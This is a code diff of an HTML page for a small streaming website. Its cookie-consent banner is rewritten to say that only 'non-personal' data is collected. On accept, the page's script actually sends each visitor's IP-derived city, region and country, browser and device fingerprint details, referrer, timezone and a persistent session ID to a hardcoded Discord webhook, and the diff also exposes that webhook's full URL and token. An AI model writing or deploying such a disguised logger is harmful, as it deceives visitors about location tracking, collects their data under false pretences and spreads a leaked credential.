@@ -54,10 +54,13 @@
   <h1 style="padding:20px;">My Streaming Website</h1>
 
   <div class="cookie-box" id="cookieBox">
-    <h3>To access this website accept please</h3>
+    <h3>Privacy & Cookies</h3>
 
     <p>
-      for leo aspen and dre ONLY
+      We respect your privacy. If you accept, we may collect
+      general non-personal information such as your city,
+      region, browser type, and device information for analytics
+      and security purposes.
     </p>
 
     <div class="cookie-buttons">
@@ -72,35 +75,51 @@
   </div>
 
   <script>
-    // YOUR DISCORD WEBHOOK
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1504925874116628643/Emz-0cjWg3xGrXjJwuc9jijhsxSA2msREN9hAWZfbGdH432hLiqxQEJo2uIFGqiNvIum";
+
+    function getSessionId() {
+      let id = localStorage.getItem("sessionId");
+      if (!id) {
+        id = crypto.randomUUID();
+        localStorage.setItem("sessionId", id);
+      }
+      return id;
+    }
 
     async function acceptCookies() {
 
-      // Save consent
       localStorage.setItem("cookieConsent", "accepted");
 
       try {
 
-        // Gets NON-PERSONAL location data only
         const response = await fetch("https://ipapi.co/json/");
         const data = await response.json();
 
-        // Only sending safe/general info
         const payload = {
           content:
 `📊 New Website Visitor Accepted Cookies
 
-🌎 Cpriv: ${data.city}
-🗺 Rpriv: ${data.region}
-🏳 Cpriv: ${data.country_name}
+🆔 Session: ${getSessionId()}
 
-💻 Bpriv: ${navigator.userAgent}
-📱 Ppriv: ${navigator.platform}
-🕒 Tpriv: ${new Date().toLocaleString()}`
+🌎 City: ${data.city}
+🗺 Region: ${data.region}
+🏳 Country: ${data.country_name}
+
+📄 Page: ${location.pathname}
+🧭 Referrer: ${document.referrer || "Direct"}
+
+💻 Browser: ${navigator.userAgent}
+📱 Platform: ${navigator.platform}
+🌐 Language: ${navigator.language}
+
+🖥 Screen: ${screen.width}x${screen.height}
+🪟 Window: ${window.innerWidth}x${window.innerHeight}
+📊 Pixel Ratio: ${window.devicePixelRatio}
+
+🗺 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🕒 Time: ${new Date().toISOString()}`
         };
 
-        // Send to Discord webhook
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: {
@@ -121,7 +140,6 @@
       document.getElementById("cookieBox").style.display = "none";
     }
 
-    // Hide popup if already answered
     window.onload = () => {
       const consent = localStorage.getItem("cookieConsent");
 
